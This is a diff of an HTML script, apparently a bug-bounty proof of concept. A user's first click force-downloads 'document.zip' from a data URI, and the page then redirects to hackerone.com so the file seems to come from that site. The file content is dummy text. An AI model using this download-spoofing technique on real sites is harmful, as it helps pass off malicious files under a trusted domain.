@@ -29,29 +29,28 @@
 
 <script>
 document.addEventListener('click', () => {
-  // Step 1: Redirect to HackerOne first
-  location.href = 'https://hackerone.com'; 
+  // Step 1: Create "legitimate" file content (e.g., a dummy file content for download)
+  const payload = 'This is some dummy content for the zip file.';
+  
+  // Create a Data URI for the content (this will be treated as a zip file for download)
+  const dataUri = `data:application/zip;base64,${btoa(payload)}`;
+  
+  // Create an <a> tag to trigger the download
+  const a = document.createElement('a');
+  a.href = dataUri;
+  a.download = 'document.zip'; // Suggested filename (ZIP file)
+  document.body.appendChild(a);
+  a.click(); // Trigger the download
 
-  // Step 2: After 3 seconds, trigger file download
+  // Clean up after triggering the download
   setTimeout(() => {
-    // Create "legitimate" file content (e.g., a dummy file content for download)
-    const payload = 'This is some dummy content for the zip file.';
-
-    // Create a Data URI for the content (this will be treated as a text file for download)
-    const dataUri = `data:application/zip;base64,${btoa(payload)}`;
-
-    // Create an <a> tag to trigger the download
-    const a = document.createElement('a');
-    a.href = dataUri;
-    a.download = 'document.zip'; // Suggested filename (ZIP file)
-    document.body.appendChild(a);
-    a.click(); // Trigger the download
-
-    // Clean up after triggering the download
-    setTimeout(() => {
-      a.remove(); // Clean up the <a> element
-    }, 1000);
-  }, 3000); // Wait 3 seconds after redirect to trigger the download
+    a.remove(); // Clean up the <a> element
+  }, 1000);
+  
+  // Step 2: Redirect to HackerOne after the download has started (after a brief delay)
+  setTimeout(() => {
+    location.href = 'https://hackerone.com';
+  }, 500); // Delay redirect slightly to ensure the download begins
 }, { once: true });
 </script>
 
